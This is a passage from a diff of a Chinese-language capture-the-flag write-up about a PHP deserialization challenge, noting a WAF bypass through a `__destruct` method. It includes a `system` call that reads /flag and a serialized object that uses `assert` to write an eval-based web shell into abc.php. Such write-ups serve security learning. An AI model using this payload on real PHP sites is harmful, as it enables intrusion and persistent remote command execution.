@@ -39,8 +39,9 @@
     ?>
 ```
 直接传参会有waf，注意到有个`__destruct`，这里也调用了`gettime`，并且没有waf；
-![[file-20251219172323661.png]]
+
 其实这里可以直接通过
+
 `call_user_func("system","cat /flag");`这样getflag，但是这里m神让写马，上面这样能命令执行了，但是这不是一次性的吗，不太懂怎么连接的，试了文件写入，好像也没权限，本地试了一下，可以写文件，题目应该是限制了权限
 ```php
 O:4:"Test":2:{s:1:"p";s:57:"file_put_contents('abc.php','<?=eval($_POST["cmd"]);?>');";s:4:"func";s:6:"assert";}
